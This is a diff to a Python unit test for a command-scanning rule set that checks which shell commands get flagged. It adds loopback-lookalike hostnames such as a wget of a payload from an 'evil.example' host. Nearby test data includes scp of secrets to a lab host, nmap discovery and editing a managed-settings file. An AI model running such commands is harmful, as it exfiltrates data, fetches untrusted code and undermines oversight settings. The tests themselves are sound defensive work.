@@ -61,6 +61,9 @@ class ScanRules(unittest.TestCase):
             "ls /proc/1234/",
             "curl -s http://localhost:8000/health",
             "curl -o out.json http://127.0.0.1:3000/api",
+            "curl http://[::1]:8080/",
+            "curl http://0.0.0.0:8000/",
+            "wget -qO- http://localhost/",
             "curl http://web:8080/login",
             "curl http://172.17.0.2:5000/",
             "python3 -m http.server 8000 --directory site.com",
@@ -85,6 +88,11 @@ class ScanRules(unittest.TestCase):
             "nmap -sn 10.77.0.0/24": ["lab-network", "network-discovery"],
             "scp secrets agent@10.77.0.1:": ["lab-network", "ssh-or-file-transfer"],
             "vi /etc/claude-code/managed-settings.json": ["sensitive-path-in-cmd"],
+            # Hosts that start like loopback but resolve anywhere.
+            "curl https://127.0.0.1.nip.io/x": ["outbound-url"],
+            "curl http://localhost.example.com:8080/": ["outbound-url"],
+            "wget https://LOCALHOST.evil.example/payload": ["outbound-url"],
+            "curl http://0.0.0.0.example.org/": ["outbound-url"],
         }
         for command, want in cases.items():
             with self.subTest(command=command):
